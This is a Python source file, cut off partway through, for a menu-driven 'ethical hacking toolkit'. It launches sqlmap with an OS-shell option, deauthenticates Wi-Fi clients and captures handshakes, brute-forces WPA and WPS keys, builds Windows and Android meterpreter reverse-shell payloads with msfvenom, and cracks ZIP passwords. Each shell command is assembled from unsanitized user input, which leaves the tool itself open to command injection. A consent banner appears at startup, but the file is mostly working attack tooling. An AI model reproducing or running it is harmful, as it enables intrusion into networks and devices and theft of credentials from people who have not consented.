#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import requests
import re
import socket
import whois
from urllib.parse import urlparse
from datetime import datetime
import ipaddress
from bs4 import BeautifulSoup
import warnings
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ===== LEGAL DISCLAIMER =====
def show_legal_warning():
    print(f"\n{Fore.RED}╔{'═'*60}╗")
    print(f"║{'LEGAL WARNING':^60}║")
    print(f"╚{'═'*60}╝{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] This tool is for authorized security testing only.")
    print(f"[!] Unauthorized use against networks you don't own is illegal.")
    print(f"[!] You are solely responsible for your actions.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] By using this tool, you agree to use it only for lawful purposes.")
    print(f"[!] The developer is not responsible for any misuse.{Style.RESET_ALL}")
    
    response = input("\nType 'I AGREE' to continue or any key to exit: ").strip()
    if response.upper() != "I AGREE":
        sys.exit(f"{Fore.RED}[!] Legal agreement not accepted. Exiting...{Style.RESET_ALL}")

# Show warning immediately when script starts
show_legal_warning()

# Clear screen function
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Display banner
def show_banner():
    print(Fore.RED + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⠴⠔⠂⠀⠀⠀⠀⠀⠐⠂⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⢶⠻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢳⣗⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣼⣛⠮⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠾⣵⢧⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣞⣟⣶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⢿⣝⡧⣄⠀⠀⠀⠀
⠀⠀⠀⣰⣻⡼⣾⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⣞⣽⣳⢆⠀⠀⠀
⠀⠀⣸⢷⣫⢷⢯⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⣼⣫⢿⣅⠀⠀
⠀⢸⣯⢯⡽⣞⣯⡇⠀⠀⠀⠀⠀⢀⣀⣠⣤⢦⣴⢶⣯⣛⣻⣞⣄⠀⠀⠀⠀⠀⠀⢸⡿⣵⢯⣟⡾⣆⠀
⢀⡿⣞⣯⣽⣛⡶⣇⠀⠀⠀⠀⠀⠀⠈⢉⣾⢿⣽⣻⣞⣷⡻⠊⠛⠂⠀⠀⠀⠀⠀⣸⢿⣽⣻⣞⣿⣽⠀
⢸⣿⡽⣞⣷⣯⢿⣽⡀⠀⠀⠀⠀⠀⢠⠿⢯⡿⣞⣷⣻⡼⡇⠀⠀⠀⠀⠀⠀⠀⢀⣿⣻⣞⣷⢿⡾⣽⡇
⢸⣷⢿⣯⣿⣾⣻⣞⡷⡄⠀⠀⠀⠀⠀⣠⣾⢿⣽⣳⣏⣷⣻⣇⠀⠀⠀⠀⠀⣀⣿⢯⣷⢿⣿⣯⣟⣯⡇
⢸⣿⣻⢻⣽⡾⣷⢯⡿⣷⣦⡀⠀⠀⣸⡿⣽⣻⡾⣗⣯⢾⡵⣯⢧⠀⠀⢀⣴⣻⣽⢿⣾⣻⣾⡟⣯⣟⡇
⠘⣿⠇⣾⢯⣿⣽⣻⣽⣷⣻⣟⣶⣴⣿⣻⣽⢷⣟⡿⣞⣯⢿⣽⣻⣤⢾⣻⣾⡽⣯⡿⣞⣷⣯⡇⠸⣿⠃
⠀⠻⠀⣿⣿⣳⣯⣟⣾⡷⣟⣾⣽⡏⢷⡿⣽⣻⡾⣿⡽⣾⣟⣾⡯⢻⣿⡽⣞⣿⣷⣿⣻⢷⣯⡧⠀⠟⠀
⠀⠀⠀⢹⣷⣯⣷⡟⣿⣟⣯⢿⣾⠁⠘⣿⣯⣷⢿⣳⡿⣷⢯⡿⠁⢸⣷⢿⣻⢷⡏⢷⣿⣻⣷⡇⠀⠀⠀
⠀⠀⠀⠘⣿⣾⣿⠁⣿⣻⡾⣿⣽⠀⠀⢹⣷⣯⡿⣯⢿⣽⢿⡇⠀⠘⣯⡿⣯⣿⣻⠈⣿⣟⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠈⢿⡯⠀⢹⣿⣽⣷⣿⡀⠀⠈⣿⣷⣿⣟⣯⡿⡿⠀⠀⢘⣿⣽⣷⣿⡇⠀⣽⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠓⠀⠀⠻⣿⣿⣾⡇⠀⠀⢸⣿⣿⣯⣿⢿⡇⠀⠀⢸⣿⣿⣾⠏⠀⠀⠛⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀  ⠀⠀⠀⠀⠙⢿⣿⣿⠀⠀⠀⣿⣿⣿⣿⡿⠀⠀⠀⣿⣿⡷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠆⠀⠀⠸⣿⣿⣿⡃⠀⠀⠰⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """ + Fore.YELLOW + "ULTIMATE ETHICAL HACKING TOOLKIT\n" + Style.RESET_ALL)
    print(Fore.CYAN + "       For Educational and Authorized Testing Only\n")

# Check if tool is installed
def check_tool(tool_name):
    try:
        subprocess.check_output(f"which {tool_name}", shell=True, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

# Install missing tools
def install_tools():
    tools = {
        'sqlmap': 'apt install sqlmap -y',
        'aircrack-ng': 'apt install aircrack-ng -y',
        'john': 'apt install john -y',
        'hashcat': 'apt install hashcat -y',
        'msfconsole': 'apt install metasploit-framework -y',
        'scapy': 'pip install scapy',
        'zip2john': 'apt install john -y',
        'crunch': 'apt install crunch -y',
        'reaver': 'apt install reaver -y',
        'bully': 'apt install bully -y',
        'wifite': 'apt install wifite -y'
    }
    
    missing = False
    for tool, cmd in tools.items():
        if not check_tool(tool):
            print(Fore.RED + f"[!] {tool} not found!")
            choice = input(Fore.YELLOW + f"[?] Install {tool} now? (y/n): ").lower()
            if choice == 'y':
                print(Fore.BLUE + f"[*] Installing {tool}...")
                os.system(f"sudo {cmd}")
                missing = True
    
    if missing:
        input(Fore.GREEN + "\n[+] Press Enter to continue after installation...")

# About section
def about_section():
    clear_screen()
    print(Fore.CYAN + """


                                                                                                
    _____         ______  ______          ____      ______   _____       ________    ________   
  /      |_       \     \|\     \     ____\_  \__   \     \  \    \     /        \  /        \  
 /         \       |     |\|     |   /     /     \   \    |  |    |    |\         \/         /| 
|     /\    \      |     |/____ /   /     /\      |   |   |  |    |    | \            /\____/ | 
|    |  |    \     |     |\     \  |     |  |     |   |    \_/   /|    |  \______/\   \     | | 
|     \/      \    |     | |     | |     |  |     |   |\         \|     \ |      | \   \____|/  
|\      /\     \   |     | |     | |     | /     /|   | \         \__    \|______|  \   \       
| \_____\ \_____\ /_____/|/_____/| |\     \_____/ |    \ \_____/\    \            \  \___\      
| |     | |     | |    |||     | | | \_____\   | /      \ |    |/___/|             \ |   |      
 \|_____|\|_____| |____|/|_____|/   \ |    |___|/        \|____|   | |              \|___|      
                                     \|____|                   |___|/                           


    """)
    print(Fore.GREEN + "The tool is made using Python and the toolkit is")
    print(Fore.YELLOW + "\nIncluded Tools:")
    print(Fore.WHITE + "- SQLMap (SQL Injection)")
    print("- Metasploit (Exploitation Framework)")
    print("- W-CRACK (Advanced Wi-Fi Cracking Suite)")
    print("- Scapy (Packet Manipulation)")
    print("- Evilginx2 (Phishing Framework)")
    print("- Hashcat (Password Cracking)")
    print("- John the Ripper (Password Cracker)")
    print("- ZipCracker (Brute-force ZIP Passwords)")
    print("- URL Scanner (Website Vulnerability Scanner)")
    print(Fore.RED + "\nCODING BY ELLIOT")
    input("\nPress Enter to return to main menu...")

# SQLMap module
def run_sqlmap():
    clear_screen()
    print(Fore.GREEN + """

                                 ,--,    
                              ,---.'|    
  .--.--.        ,----..      |   | :    
 /  /    '.     /   /   \     :   : |    
|  :  /`. /    /   .     :    |   ' :    
;  |  |--`    .   /   ;.  \   ;   ; '    
|  :  ;_     .   ;   /  ` ;   '   | |__  
 \  \    `.  ;   |  ; \ ; |   |   | :.'| 
  `----.   \ |   :  | ; | '   '   :    ; 
  __ \  \  | .   |  ' ' ' :   |   |  ./  
 /  /`--'  / '   ;  \; /  |   ;   : ;    
'--'.     /   \   \  ',  . \  |   ,/     
  `--'---'     ;   :      ; | '---'      
                \   \ .'`--"             
                 `---`                     
    """)
    target = input(Fore.YELLOW + "[?] Enter target URL (e.g., http://test.com/vuln.php?id=1): ")
    if not target:
        print(Fore.RED + "[!] No target specified!")
        time.sleep(2)
        return
    
    print(Fore.BLUE + "\nAvailable options:")
    print("[1] Basic scan (--batch --dbs)")
    print("[2] Aggressive scan (--risk 3 --level 5)")
    print("[3] OS shell attempt (--os-shell)")
    choice = input(Fore.YELLOW + "\n[?] Select scan type: ")
    
    if choice == '1':
        cmd = f"sqlmap -u {target} --batch --dbs"
    elif choice == '2':
        cmd = f"sqlmap -u {target} --risk 3 --level 5 --batch"
    elif choice == '3':
        cmd = f"sqlmap -u {target} --os-shell --batch"
    else:
        cmd = f"sqlmap -u {target} --batch"
    
    print(Fore.CYAN + f"\n[*] Running: {cmd}")
    os.system(cmd)
    input(Fore.GREEN + "\n[+] Press Enter to return to main menu...")

# W-CRACK module (Advanced Wi-Fi Cracking Suite)
def run_wcrack():
    clear_screen()
    print(Fore.RED + """
     ______        _____         _____    _____   ______        ______        _____   
 ___|\     \   ___|\    \    ___|\    \  |\    \ |\     \   ___|\     \   ___|\    \  
|    |\     \ /    /\    \  /    /\    \  \\    \| \     \ |     \     \ |    |\    \ 
|    |/____/||    |  |    ||    |  |    |  \|    \  \     ||     ,_____/||    | |    |
|    |\____|/|    |  |____||    |__|    |   |     \  |    ||     \--'\_|/|    |/____/ 
|    |/____| |    |   ____ |    .--.    |   |      \ |    ||     /___/|  |    |\    \ 
|    |\     \|    |  |    ||    |  |    |   |    |\ \|    ||     \____|\ |    | |    |
|\ ___\|_____||\ ___\/    /||____|  |____|   |____||\_____/||____ '     /||____| |____|
| |    |     || |   /____/ ||    |  |    |   |    |/ \|   |||    /_____/ ||    | |    |
 \|____|_____| \|___|    | /|____|  |____|   |____|   |___|/|____|     | /|____| |____|
    \(    )/     \( |____|/   \(      )/       \(       )/    \( |_____|/   \(     )/  
     '    '       '   )/       '      '         '       '      '    )/       '     '   
                       '                                             '                  
    """)
    
    print(Fore.YELLOW + "\n[1] Start monitor mode")
    print("[2] Stop monitor mode")
    print("[3] Scan Networks")
    print("[4] Capture Handshake (monitor mode needed)")
    print("[5] Install Wireless tools")
    print("[6] Crack Handshake with rockyou.txt")
    print("[7] Crack Handshake with custom wordlist")
    print("[8] Crack Handshake without wordlist (Brute-force)")
    print("[9] Create custom wordlist")
    print("[10] WPS Networks attacks")
    print("[11] Scan for WPS Networks")
    print("[0] About")
    print("[00] Back to Main Menu")
    
    choice = input(Fore.YELLOW + "\n[?] Select option: ")
    
    if choice == '1':
        interface = input("[?] Enter wireless interface (e.g., wlan0): ")
        os.system(f"sudo airmon-ng start {interface} && airmon-ng check kill")
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '2':
        interface = input("[?] Enter monitor interface (e.g., wlan0mon): ")
        os.system(f"sudo airmon-ng stop {interface} && service network-manager restart")
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '3':
        interface = input("[?] Enter monitor interface (e.g., wlan0mon): ")
        print(Fore.BLUE + "\n[+] Scanning networks (Press CTRL+C to stop)...")
        os.system(f"sudo airodump-ng {interface} -M")
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '4':
        interface = input("[?] Enter monitor interface (e.g., wlan0mon): ")
        os.system(f"sudo airodump-ng {interface} -M")
        print(Fore.YELLOW + "\n[!] Note: Under Probe it might be Passwords So copy them to the wordlist file")
        print("[!] Don't Attack The Network if its Data is ZERO (you waste your time)")
        print("[!] You Can use 's' to arrange networks")
        
        bssid = input("\n[?] Enter the BSSID of the target: ")
        channel = input("[?] Enter the channel of the network: ")
        output = input("[?] Enter path for output file (no extension): ")
        packets = input("[?] Enter number of packets [1-10000] (0 for unlimited): ")
        
        cmd = f"sudo airodump-ng {interface} --bssid {bssid} -c {channel} -w {output} | xterm -e aireplay-ng -0 {packets} -a {bssid} {interface}"
        os.system(cmd)
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '5':
        def install_wireless_tools():
            clear_screen()
            print(Fore.CYAN + """
1) Aircrack-ng                          17) kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) mdk3
5) Bluepot                              21) mfcuk
6) BlueRanger                           22) mfoc
7) Bluesnarfer                          23) mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) crackle                             26) Reaver
11) eapmd5pass                          27) redfang
12) Fern Wifi Cracker                   28) RTLSDR Scanner
13) Ghost Phisher                       29) Spooftooph
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) gr-scan
16) Wifite                              32) Back to W-CRACK menu
90) airgeddon
91) wifite v2

0) Install all wireless tools
            """)
            tool = input("\n[?] Select tool to install (or 0 for all): ")
            
            if tool == '1':
                os.system("sudo apt-get install aircrack-ng -y")
            elif tool == '90':
                os.system("sudo apt-get install git -y && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git")
            elif tool == '91':
                os.system("sudo apt-get install git -y && git clone https://github.com/derv82/wifite2.git")
            elif tool == '2':
                os.system("sudo apt-get install asleap -y")
            elif tool == '3':
                os.system("sudo apt-get install bluelog -y")
            elif tool == '4':
                os.system("sudo apt-get install bluemaho -y")
            elif tool == '5':
                os.system("sudo apt-get install bluepot -y")
            elif tool == '6':
                os.system("sudo apt-get install blueranger -y")
            elif tool == '7':
                os.system("sudo apt-get install bluesnarfer -y")
            elif tool == '8':
                os.system("sudo apt-get install bully -y")
            elif tool == '9':
                os.system("sudo apt-get install cowpatty -y")
            elif tool == '10':
                os.system("sudo apt-get install crackle -y")
            elif tool == '11':
                os.system("sudo apt-get install eapmd5pass -y")
            elif tool == '12':
                os.system("sudo apt-get install fern-wifi-cracker -y")
            elif tool == '13':
                os.system("sudo apt-get install ghost-phisher -y")
            elif tool == '14':
                os.system("sudo apt-get install giskismet -y")
            elif tool == '15':
                os.system("sudo apt-get install git -y && git clone git://git.kali.org/packages/gr-scan.git")
            elif tool == '16':
                os.system("sudo apt-get install kalibrate-rtl -y")
            elif tool == '17':
                os.system("sudo apt-get install killerbee -y")
            elif tool == '18':
                os.system("sudo apt-get install kismet -y")
            elif tool == '19':
                os.system("sudo apt-get install mdk3 -y")
            elif tool == '20':
                os.system("sudo apt-get install mfcuk -y")
            elif tool == '21':
                os.system("sudo apt-get install mfoc -y")
            elif tool == '22':
                os.system("sudo apt-get install mfterm -y")
            elif tool == '23':
                os.system("sudo apt-get install multimon-ng -y")
            elif tool == '24':
                os.system("sudo apt-get install pixiewps -y")
            elif tool == '25':
                os.system("sudo apt-get install reaver -y")
            elif tool == '26':
                os.system("sudo apt-get install redfang -y")
            elif tool == '27':
                os.system("sudo apt-get install rtlsdr-scanner -y")
            elif tool == '28':
                os.system("sudo apt-get install spooftooph -y")
            elif tool == '29':
                os.system("sudo apt-get install wifi-honey -y")
            elif tool == '30':
                os.system("sudo apt-get install wifitap -y")
            elif tool == '31':
                os.system("sudo apt-get install wifite -y")
            elif tool == '32':
                run_wcrack()
            elif tool == '0':
                os.system("sudo apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite")
            else:
                print(Fore.RED + "[!] Invalid option")
            
            input(Fore.GREEN + "\n[+] Press Enter to continue...")
            install_wireless_tools()
        
        install_wireless_tools()
    elif choice == '6':
        cap_file = input("[?] Enter path to .cap file: ")
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            os.system(f"sudo aircrack-ng {cap_file} -w /usr/share/wordlists/rockyou.txt")
        else:
            os.system("sudo gzip -d /usr/share/wordlists/rockyou.txt.gz")
            os.system(f"sudo aircrack-ng {cap_file} -w /usr/share/wordlists/rockyou.txt")
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '7':
        cap_file = input("[?] Enter path to .cap file: ")
        wordlist = input("[?] Enter path to wordlist: ")
        os.system(f"sudo aircrack-ng {cap_file} -w {wordlist}")
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '8':
        cap_file = input("[?] Enter path to .cap file: ")
        essid = input("[?] Enter ESSID of network: ")
        min_len = input("[?] Enter minimum password length (8-64): ")
        max_len = input("[?] Enter maximum password length (8-64): ")
        
        print(Fore.CYAN + """
[1] Lowercase chars (abcdefghijklmnopqrstuvwxyz)
[2] Uppercase chars (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
[3] Numeric chars (0123456789)
[4] Symbol chars (!#$%/=?{}[]-*:;)
[5] Lowercase + uppercase
[6] Lowercase + numeric
[7] Uppercase + numeric
[8] Symbol + numeric
[9] Lowercase + uppercase + numeric
[10] Lowercase + uppercase + symbol
[11] All chars
[12] Custom charset
        """)
        charset = input("\n[?] Select charset: ")
        
        if charset == '1':
            chars = "abcdefghijklmnopqrstuvwxyz"
        elif charset == '2':
            chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        elif charset == '3':
            chars = "0123456789"
        elif charset == '4':
            chars = "!#$%/=?{}[]-*:;"
        elif charset == '5':
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        elif charset == '6':
            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        elif charset == '7':
            chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        elif charset == '8':
            chars = "!#$%/=?{}[]-*:;0123456789"
        elif charset == '9':
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        elif charset == '10':
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;"
        elif charset == '11':
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;"
        elif charset == '12':
            chars = input("[?] Enter custom charset: ")
        else:
            print(Fore.RED + "[!] Invalid option")
            run_wcrack()
        
        print(Fore.YELLOW + "\n[!] This may take a long time...")
        os.system(f"sudo crunch {min_len} {max_len} {chars} | sudo aircrack-ng {cap_file} -e {essid} -w-")
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '9':
        min_len = input("[?] Enter minimum length (8-64): ")
        max_len = input("[?] Enter maximum length (8-64): ")
        output = input("[?] Enter output file path: ")
        chars = input("[?] Enter characters to include (or leave blank for default): ")
        
        if chars:
            os.system(f"sudo crunch {min_len} {max_len} {chars} -o {output}")
        else:
            os.system(f"sudo crunch {min_len} {max_len} -o {output}")
        
        print(Fore.GREEN + f"\n[+] Wordlist saved to {output}")
        input("\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '10':
        print(Fore.CYAN + """
[1] Reaver
[2] Bully
[3] Wifite (Recommended)
[4] PixieWPS
        """)
        tool = input("\n[?] Select attack tool: ")
        
        interface = input("[?] Enter monitor interface (e.g., wlan0mon): ")
        bssid = input("[?] Enter BSSID of target: ")
        
        if tool == '1':
            os.system(f"sudo reaver -i {interface} -b {bssid} -vv")
        elif tool == '2':
            channel = input("[?] Enter channel: ")
            os.system(f"sudo bully -b {bssid} -c {channel} --pixiewps {interface}")
        elif tool == '3':
            os.system(f"sudo wifite")
        elif tool == '4':
            os.system(f"sudo reaver -i {interface} -b {bssid} -K")
        else:
            print(Fore.RED + "[!] Invalid option")
        
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '11':
        interface = input("[?] Enter monitor interface (e.g., wlan0mon): ")
        os.system(f"sudo airodump-ng -M --wps {interface}")
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '0':
        clear_screen()
        print(Fore.CYAN + """
HI
MY PROFILE {https://github.com/ElliotV56}
IAM Elliot IAM FUC*ING NOOB HACKER AND I MAKE TOOLS AND REMAKE A TOOLS
I DON`T HAVE ANY THINK TO SAY!!!
ENJOY MA MAN
        """)
        input(Fore.GREEN + "\n[+] Press Enter to continue...")
        run_wcrack()
    elif choice == '00':
        return
    else:
        print(Fore.RED + "[!] Invalid option")
        time.sleep(2)
        run_wcrack()

# Metasploit module
def run_metasploit():
    clear_screen()
    print(Fore.RED + """
    ███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
    ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
    ██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
    ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
    """)
    
    print(Fore.YELLOW + "\n[1] Start msfconsole")
    print("[2] Create payload (Windows)")
    print("[3] Create payload (Android)")
    print("[4] Exploit search")
    choice = input(Fore.YELLOW + "\n[?] Select option: ")
    
    if choice == '1':
        os.system("msfconsole")
    elif choice == '2':
        lhost = input("[?] Enter your IP: ")
        lport = input("[?] Enter port: ")
        output = input("[?] Enter output filename: ")
        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}")
        print(Fore.GREEN + f"[+] Payload saved as {output}")
    elif choice == '3':
        lhost = input("[?] Enter your IP: ")
        lport = input("[?] Enter port: ")
        output = input("[?] Enter output filename: ")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}")
        print(Fore.GREEN + f"[+] Payload saved as {output}")
    elif choice == '4':
        search = input("[?] Enter exploit to search: ")
        os.system(f"msfconsole -q -x 'search {search}; exit'")
    else:
        print(Fore.RED + "[!] Invalid option")
    
    input(Fore.GREEN + "\n[+] Press Enter to return to main menu...")

# ZIP Cracker module
def run_zipcracker():
    clear_screen()
    print(Fore.CYAN + """
▓█████▄  ██▀███   ▄▄▄       ██▓███   ██▓███   ██▓ ▄████▄   ██▓    
▒██▀ ██▌▓██ ▒ ██▒▒████▄    ▓██░  ██▒▓██░  ██▒▓██▒▒██▀ ▀█  ▓██▒    
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▓██░ ██▓▒▓██░ ██▓▒▒██▒▒▓█    ▄ ▒██░    
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▄█▓▒ ▒░██░▒▓▓▄ ▄██▒▒██░    
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ░  ░▒██▒ ░  ░░██░▒ ▓███▀ ░░██████▒
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▓▒░ ░  ░▒▓▒░ ░  ░░▓  ░ ░▒ ▒  ░░ ▒░▓  ░
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░░▒ ░     ░▒ ░      ▒ ░  ░  ▒   ░ ░ ▒  ░
 ░ ░  ░   ░░   ░   ░   ▒   ░░       ░░        ▒ ░░          ░ ░   
   ░       ░           ░  ░                  ░  ░ ░          ░  ░
░                                         ░                     

    """)
    
    zip_file = input(Fore.YELLOW + "[?] Enter ZIP file path: ")
    if not os.path.isfile(zip_file):
        print(Fore.RED + "[!] File not found!")
        time.sleep(2)
        return
    
    print(Fore.BLUE + "\nAvailable options:")
    print("[1] Dictionary attack (recommended)")
    print("[2] Brute-force (slow)")
    choice = input(Fore.YELLOW + "\n[?] Select attack type: ")
    
    if choice == '1':
        wordlist = input("[?] Enter wordlist path: ")
        if not os.path.isfile(wordlist):
            print(Fore.RED + "[!] Wordlist not found!")
            time.sleep(2)
            return
        print(Fore.BLUE + "[*] Creating hash file...")
        os.system(f"zip2john {zip_file} > zip_hash.txt")
        print(Fore.BLUE + "[*] Running John the Ripper...")
        os.system(f"john --wordlist={wordlist} zip_hash.txt")
    elif choice == '2':
        print(Fore.BLUE + "[*] Creating hash file...")
        os.system(f"zip2john {zip_file} > zip_hash.txt")
        print(Fore.BLUE + "[*] Running brute-force attack...")
        os.system("john --incremental zip_hash.txt")
    else:
        print(Fore.RED + "[!] Invalid option")
        return
    
    print(Fore.GREEN + "\n[+] Checking results...")
    os.system("john --show zip_hash.txt")
    input(Fore.GREEN + "\n[+] Press Enter to return to main menu...")

# URL Scanner module
class DragonURLScanner:
    def __init__(self):
        self.clear_screen()
        self.show_url_banner()
        self.scan_url_menu()

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_url_banner(self):
        print(f"""{Fore.RED}
  
         ______        _____         _____    _____   ______        ______        _____   
     ___|\     \   ___|\    \    ___|\    \  |\    \ |\     \   ___|\     \   ___|\    \  
    |    |\     \ /    /\    \  /    /\    \  \\    \| \     \ |     \     \ |    |\    \ 
    |    |/____/||    |  |    ||    |  |    |  \|    \  \     ||     ,_____/||    | |    |
 ___|    \|   | ||    |  |____||    |__|    |   |     \  |    ||     \--'\_|/|    |/____/ 
|    \    \___|/ |    |   ____ |    .--.    |   |      \ |    ||     /___/|  |    |\    \ 
|    |\     \    |    |  |    ||    |  |    |   |    |\ \|    ||     \____|\ |    | |    |
|\ ___\|_____|   |\ ___\/    /||____|  |____|   |____||\_____/||____ '     /||____| |____|
| |    |     |   | |   /____/ ||    |  |    |   |    |/ \|   |||    /_____/ ||    | |    |
 \|____|_____|    \|___|    | /|____|  |____|   |____|   |___|/|____|     | /|____| |____|V1.0.0
    \(    )/        \( |____|/   \(      )/       \(       )/    \( |_____|/   \(     )/  
     '    '          '   )/       '      '         '       '      '    )/       '     '   
                         '                                             '                  
{Fore.BLUE}
    Advanced URL Security Scanner - Detect Vulnerabilities & Threats
{Style.RESET_ALL}""")

    def scan_url_menu(self):
        while True:
            print(f"\n{Fore.CYAN}URL Scanner Menu:{Style.RESET_ALL}")
            print("1. Scan a URL")
            print("2. Download Website HTML")
            print("3. Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}Select an option (1-3): {Style.RESET_ALL}").strip()
            
            if choice == "1":
                url = input(f"\n{Fore.BLUE}Enter URL to scan: {Style.RESET_ALL}").strip()
                if url.lower() in ['exit', 'back']:
                    continue
                if url:
                    self.scan_url(url)
                    input(f"\n{Fore.BLUE}Press Enter to continue...{Style.RESET_ALL}")
                    self.clear_screen()
                    self.show_url_banner()
            elif choice == "2":
                self.download_html()
                input(f"\n{Fore.BLUE}Press Enter to continue...{Style.RESET_ALL}")
                self.clear_screen()
                self.show_url_banner()
            elif choice == "3":
                return
            else:
                print(f"\n{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")

    def download_html(self):
        url = input(f"\n{Fore.BLUE}Enter URL to download HTML: {Style.RESET_ALL}").strip()
        if not url:
            print(f"{Fore.RED}[!] No URL provided{Style.RESET_ALL}")
            return
            
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        try:
            print(f"\n{Fore.BLUE}[+] Downloading HTML from: {url}{Style.RESET_ALL}")
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            
            # Get desktop path
            desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') if os.name == 'nt' else os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')
            file_path = os.path.join(desktop, 'dragon.html')
            
            # Save HTML to file
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(response.text)
                
